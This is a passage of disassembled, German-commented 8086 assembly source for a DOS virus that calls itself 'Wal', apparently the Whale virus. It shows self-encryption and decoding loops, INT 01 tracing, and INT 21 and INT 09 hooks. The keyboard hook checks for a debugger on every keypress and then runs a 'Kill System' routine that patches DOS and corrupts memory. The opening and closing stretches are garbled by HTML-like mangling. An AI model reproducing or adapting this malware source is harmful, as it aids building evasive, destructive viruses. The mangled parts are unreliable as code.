mov="" bp,ax="" j04958:="" in="" al,40h="" ;="" hole="" zufallszahl=""><> 0
                OR      AL,AL
                JZ      J04958
                POP     BX              ; Hole Adresse des Aufrufers
                PUSH    BX
                MOV     CX,Offset J02ACC-Offset J02AA8
                SUB     BX,CX           ; 24h Byte zurckgehen
J04965:         XOR     CS:[BX],AL
                INC     BX
                LOOP    J04965
                CALL    J0496E
J0496E:         POP     BX
                ADD     BX,Offset SpielByte-Offset J0496E
                                        ; Adresse "Spielbyte" holen
                MOV     CS:[BX],AL      ; und den Dekodierer impfen
                MOV     AX,BP
                RETN
;=====================================================================
;=======================================( dekodiert den Relokator )===
;=====================================================================
DecodeFollowingCode:
                MOV     BP,AX           ; AX sichern
                POP     BX
                PUSH    BX
                MOV     CX,Offset J02ACC-Offset J02AA8
J0497F:         XOR     BYTE PTR CS:[BX],0      ; <== "spielbyte"="" spielbyte="" equ="" $-1="" inc="" bx="" j04984:="" loop="" j0497f="" mov="" ax,bp="" j04987="" equ="" $-1="" ;="" call="" nirwana="" !="" siehe="" unten="" !="" retn="" ;="" ax="" zurueck="" ;="====================================================================" ;="=======================================(" kodiert="" jede="" 'schuppe'="" )="==" ;="====================================================================" codeit:="" pushf="" pop="" cs:[d258e]="" mov="" cs:[d2560],ax="" mov="" cs:[d2562],bx="" mov="" cs:[d2564],cx="" ;-------------------------------------(="" aus="" )-----------------="" j0499d:="" db="" 26h,3bh,8ah,0fh,32h,72h,0e3h="" ;-------------------------------------(="" wird="" )----------------="" ;j0499d:="" pop="" bx="" ;="" pop="" returnadresse="" ;="" mov="" cl,byte="" ptr="" cs:[bx]="" ;="" get="" byte="" in="" cl="" ;="" xor="" ch,ch="" ;="" inc="" bx="" ;="" return="" eins="" weiter="" ;-------------------------------------------------------------="" push="" bx="" mov="" ax,0001h="" add="" ax,cx="" ;="" ax="" ist="" byte="" +="" 1="" sub="" bx,ax="" ;="" bx="" ist="" returnadresse-ax="" ;-------------------------------------(="" aus="" )-----------------="" db="" 043h,040h,00ah,0c0h,074h,0fah="" ;-------------------------------------(="" wird="" )----------------="" ;j049ac:="" in="" al,40h="" ;="" or="" al,al="" ;="" jz="" j049ac="" ;="" hole="" zufallszahl=""></==><> 0
        ;-------------------------------------------------------------
                MOV     CX,CS:[BX]
                XOR     CH,CH
                INC     BX
        ;-------------------------------------( aus )-----------------
                DB      003h,00fh,02eh,03bh,007h,072h,0c7h,0f8h
        ;-------------------------------------( wird )----------------
        ;               MOV     CS:[BX],AL
        ;J001A0:        INC     BX
        ;               XOR     CS:[BX],AL
        ;               LOOP    J001A0
        ;-------------------------------------------------------------
J049C0:         CLI
                MOV     AX,CS:[D2560]
                MOV     BX,CS:[D2562]
                MOV     CX,CS:[D2564]
                PUSH    CS:[D258E]
                POPF
                RETN
;=====================================================================
;====================================================( Der Tracer )===
;=====================================================================
Int_01_Entry:   PUSH    BP
                MOV     BP,SP
                PUSH    AX
                CMP     WORD Ptr [BP+04h],0C000h  ; Callers Segment
                JNB     J049ED                    ; h”her als C000h
                MOV     AX,CS:[D2447]             ; oder tiefer
                CMP     [BP+04h],AX               ; als D2447
                JBE     J049ED
J049EA:         POP     AX
                POP     BP
                IRET
;=====================================================================
J049ED:         CMP     BYTE PTR CS:[D2450],01h        ; Erster
                JZ      J04A1B

                MOV     AX,[BP+04h]                    ; Callers CS
                MOV     WORD PTR CS:[Trace_Adres+2],AX
                MOV     AX,[BP+02h]                    ; Callers IP
                MOV     WORD PTR CS:[Trace_Adres  ],AX
                JB      StopTrace                      ; [D2450] < 1="" pop="" ax="" pop="" bp="" mov="" sp,cs:[d24df]="" mov="" ss,cs:[d24dd]="" jmp="" j0488d="" ;="" -=""> RET hier irgendwo
;==========================================( Trace-Mode abschalten)===
StopTrace:      AND     WORD Ptr [BP+06h],0FEFFh
                JMP     J049EA
;=====================================================================
J04A1B:         DEC     BYTE PTR CS:[D2450+1]         ; Dec (Versuche)
                JNZ     J049EA                        ; <> 0 -> weiter
                AND     WORD Ptr [BP+06h],0FEFFh      ; sonst tracen
                CALL    SaveRegisters                 ; stoppen und :
;=====================================================================
;=======================( AUS : )=====================================
;=====================================================================
J04A2A:         DB      0fch,01eh,0e2h,0e4h,040h
;=====================================================================
;========================( WIRD, ber PATCH )=========================
;=====================================================================
                ;CALL    J02CDA
                ;IN      AL,40h
;=====================================================================
;===============================================( XOR-Byte „ndern )===
;=====================================================================
                MOV     CS:[XorByte__1],AL           ; D_4A5E
                MOV     CS:[XorByte__2],AL           ; D_4A79
;=====================================================================
;=====================================( INT 01 auf INT 03 stellen )===
;=====================================================================
J04A39:         MOV     AL,03h
                CALL    GetInt_AL       ; GET INT 3

                PUSH    ES
                POP     DS
                MOV     DX,BX           ; DS:DX auf INT 3 stellen
                MOV     AL,01h
;=================================================================
;======( AUS : )==================================================
;=================================================================
J04A42:         DB      0e8h,027h
J04A44:         DB      01h             ; CALL    J04B6C
                DB      0EAh,072h,0e1h  ; JB      J04A29
;=================================================================
;===================( Wird ber PATCH )===========================
;=================================================================
                CALL    SetInt_AL       ; INT 01 auf INT 03 setzen
                CALL    POPALL
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirstack
                CALL    Re_SET_Int_02
                POP     AX
                POP     BP              ; Stack putzen

                PUSH    BX
                PUSH    CX
                MOV     BX,PART_____1
                MOV     CX,LEN_PART_1
J04A5B:         XOR     BYTE PTR CS:[BX],8Eh
D_4A5E  EQU     $-1
                INC     BX
                LOOP    J04A5B
                POP     CX
                POP     BX
                IRET                    ; ENDE von INT 01 / Tracer
                DB      0E9h
;=====================================================================
;================================================( INT 21-Handler )===
;=====================================================================
J04A66:         OR      BYTE PTR CS:[PART_____1],00h  ; = D4BAC
                                           ; ist Wal schon DEkodiert ?
                JZ      J04A7F
                PUSH    BX                 ; Nein.
J04A6F:         PUSH    CX
                MOV     BX,PART_____1
                MOV     CX,LEN_PART_1
J04A76:         XOR     BYTE PTR CS:[BX],8EH
D_4A79  EQU     $-1
                INC     BX
                LOOP    J04A76
                POP     CX
                POP     BX
J04A7F:         JMP     J0458D
;=====================================================================
                DB      34h
;=====================================================================
;=======================(              INT 09-Handler             )===
;=======================( Bei jedem (!) Tastendruck wird geprft, )===
;=======================( ob ein Debugger am Werk ist !           )===
;=====================================================================
J04A83:         MDECODE 92
                CALL    Patch_INT_09   ; INT 9 restaurieren
                CALL    Debugger_Check ; Das ist der Witz dabei !!!
                PUSHF
                CALL    CS:[INT_09  ]  ; CALL INT 09
                CALL    Patch_INT_09   ; Int 9 wieder patchen
                MCODE   92
                IRET
;=======================================================()=========
                DB      0BCH
;=====================================================================
;=======================================( Save Original-Registers )===
;=====================================================================
SaveRegs:       MOV     CS:[D2575],SI
                MOV     CS:[D2577],DI
                MOV     CS:[D257B],DS
                MOV     CS:[D257D],ES
J04AB1:         MOV     CS:[D2579],AX
                MOV     CS:[D257F],CX
                MOV     CS:[D2581],BX
                MOV     CS:[D2590],DX
                RETN
                ;-----------------------------------------------------
                DB      0E8h
                DB      01h
;=====================================================================
;=============================( PATCHT vorhandenen INT 09-Handler )===
;=====================================================================
KeyBoard        DB      0
Patch_INT_09:   MDECODE 93
                CALL    SaveRegs
;-----------------------------------------------------------
                MOV     SI,Offset D2570
                LES     DI,CS:[INT_09  ]       ; GET original INT 09
                PUSH    CS
                POP     DS
                CLD
;---------------------------( Tauscht 5 Byte ab CS:D2570  -> ES:DI )--
                MOV     CX,0005h
J04ADD:         LODSB
                XCHG    AL,ES:[DI]
                MOV     [SI-01h],AL
                INC     DI
                LOOP    J04ADD
;----------------------------------------( anzeige )-------------------
                MOV     AX,0B800H
                MOV     ES,AX
                XOR     DI,DI
                CMP     byte ptr cs:[Offset Keyboard-Offset VirStart],1
                MOV     Byte ptr cs:[Offset Keyboard-Offset VirStart],0
                MOV     AX,432EH
                JZ      ToOriginal
                MOV     Byte ptr cs:[Offset Keyboard-Offset VirStart],1
                MOV     AX,4b57h
ToOriginal:     STOSW
;-----------------------------------------------------------
                CALL    RestoreRegs
                MCODE   93
                RETN
;=====================================================================
;====================================(    GET INT 01 + INT 03     )===
;====================================( Check, ob Debugger werkelt )===
;=====================================================================
Debugger_Check:
                MDECODE 94
                MOV     CS:[D2581],BX
                MOV     CS:[D257D],ES
                XOR     BX,BX
                MOV     ES,BX
                MOV     BX,ES:[0006h]           ; GET Offset von INT 01
                CMP     BX,CS:[D2447]
                JNB     J04B27                  ; TRACER   AM WERK
                MOV     BX,ES:[000Eh]           ; GET Offset von INT 03
                CMP     BX,CS:[D2447]
                JNB     J04B27                  ; DEBUGGER AM WERK
                MOV     ES,CS:[D257D]
                MOV     BX,CS:[D2581]
                JMP     J04B76
;=====================================================================
;=================================================( Kill System ! )===
;=====================================================================
J04B27:         POP     BX                       ; POP returnadresse
                CALL    PushALL
                CALL    Patch_IBMDOS             ; DOS patchen
                CALL    PopALL

                MOV     BX,CS:[D2581]
                MOV     ES,CS:[D257D]

                PUSHF
                CALL    CS:[INT_09  ]             ; CALL INT 09

                CALL    PushALL

                MOV     AH,51h                    ; get current PSP
                CALL    CS:[@INT21]

                MOV     ES,BX
J04B4D:
                MOV     WORD PTR ES:[000Ch],0FFFFh; Terminate-Adresse
                MOV     WORD PTR ES:[000Ah],0000h ; ist FFFF:0000 !?!
                CALL    PopALL
                CALL    SaveRegs
                ;---------------------------------( Wal zerst”ren )---
                MOV     CX,IfDebugWal   ; 1185h   ; 230Ah Byte
                MOV     BX,StartDebug   ; 004Fh   ; ab 4Fh / 285Fh
                MOV     AX,0802h        ; mit 0802h verORen
J04B6A:         OR      CS:[BX],AX      ; bis 4B69 , logisch, oder ....
                ADD     BX,+02h
                LOOP    J04B6A
                ;----------------------------------------------------
                CALL    RestoreRegs
                IRET
;=====================================================================
;=========================================( Kein Debugger am Werk )===
;=====================================================================
J04B76:         MCODE   94
                RET
D4B7C:          DB      0E8h
;=====================================================================
;=========( Verwischt Spuren und springt in oberen Speicherbereich)===
;=====================================================================
Schwimme_Fort:  OR      BYTE PTR CS:[BX],15h ; CX = 236Ch
                INC     BX                   ; BX = 0
                LOOP    Schwimme_Fort        ; also von 2810 bis D4B7C
                                             ; alles l”schen
                RETF                         ; RETF nach
                                             ; Oberen-Speicher:01B1
                                             ; Identisch mit CS:29C1
;=====================================================================
;========================================( Get Original-Registers )===
;=====================================================================
RestoreRegs:    MOV     AX,CS:[D2579]
                MOV     ES,CS:[D257D]
                MOV     DS,CS:[D257B]
                MOV     SI,CS:[D2575]
                MOV     DI,CS:[D2577]
                MOV     CX,CS:[D257F]
                MOV     BX,CS:[D2581]
                MOV     DX,CS:[D2590]
L0L0L0:         RETN
;----------------------------------------------------------------------
D4BAC           DB      00h          ; Signal-Byte zur Erkennung,
                                     ; ob Wal dekodiert ist oder nicht
;=====================================================================
;=============================================( Verschlsselt WAL )===
;=====================================================================
Code_Whale:     PUSH    CX
                PUSH    BX
                MOV     BX,FirstByte
                MOV     CX,Code_len     ; 2385h ; Wal-Size
LASTCODE:       ;^^^^^^^^^^^-- LETZTES VERSCHLUESSELTE BYTE        !
;---------------------------------------------------------------------
D4BB5:          ;vvvvvvvvvvv-- HIERHER WERDEN DIE MUTANTEN KOPIERT !
                PUSH    DX
                MOV     DH,[BX-01h]
J04BB9:         MOV     DL,[BX    ]
                ADD     [BX],DH
                XCHG    DL,DH
                INC     BX
                LOOP    J04BB9

                POP     DX
                POP     BX
                POP     CX
                PUSH    SI
                MOV     SI,2567h
                DEC     SI
                CALL    [SI]            ; CALL INT 21h
;=====================================================================
;============================================( Normaler Einsprung )===
;=====================================================================
Decode_Whale:   CALL    J04BD1
J04BCF:         XOR     BX,SI           ; DUMMY !
J04BD1:         XOR     SI,1876h        ; SI = 1876, kann immer
                                        ; ge„ndert werden
                POP     BX              ; BX = 4BCF
                POP     SI
                SUB     BX,Code_start   ; BX = 2830
                MOV     CX,Code_Len     ; CX = 2385 wal-size
                PUSH    CS
                POP     DS
J04BE0:         MOV     AL,[BX-01h]
                SUB     [BX],AL
                INC     BX
                LOOP    J04BE0
                                        ; BX = 4BB5
                ADD     BX,008Eh        ; BX = 4C43 / 2433
                XCHG    SI,BX
                DEC     BYTE Ptr DS:[SI]
                JNZ     J04BF5
                XCHG    BX,SI
                RETN                    ;
;=====================================================================
;==============================================( Sprung zu ENTRY )===
;=====================================================================
J04BF5:         PUSH    ES              ; SI ist 4C43
                XOR     AX,AX
                POP     DS
                JMP     ENTRY
;=====================================================================
;==========================================================( ENDE )===
;=====================================================================
                DW      0CE8BH
                DW      05605H
LASTBYTE:       DB         34H

J04C01:         DW      00045h
                DW      05000h
                DW      0DCE3h
                DW      09000h
                DW      00000h
                DW      01F00H
                DW      02000H
                DB      10H
;============================================================================
code    ENDS
        END  start


</----></-></-></-ax></-></057h,l1d0f></04fh,l1f70></04eh,l1f70></04bh,l0ad4></042h,l1da2></03fh,l1e5e></03eh,l09e4></03dh,l0996></027h,l06c8></023h,l08cf></021h,l06ca></014h,l06e0></012h,l04f4></011h,l04f4></00fh,l0699></----------------(>